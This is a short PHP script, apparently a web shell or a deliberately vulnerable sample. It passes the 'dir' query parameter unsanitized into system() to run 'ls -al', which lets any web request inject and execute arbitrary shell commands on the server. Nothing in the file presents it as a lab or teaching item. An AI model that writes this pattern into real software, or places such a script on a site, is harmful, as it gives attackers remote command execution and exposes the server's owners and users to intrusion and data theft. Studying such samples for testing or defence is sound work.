<?php
$dir = $_GET["dir"];
if(isset($dir))
{
echo "<pre>";
system("ls -al ".$dir);
echo "</pre>";
}
?>
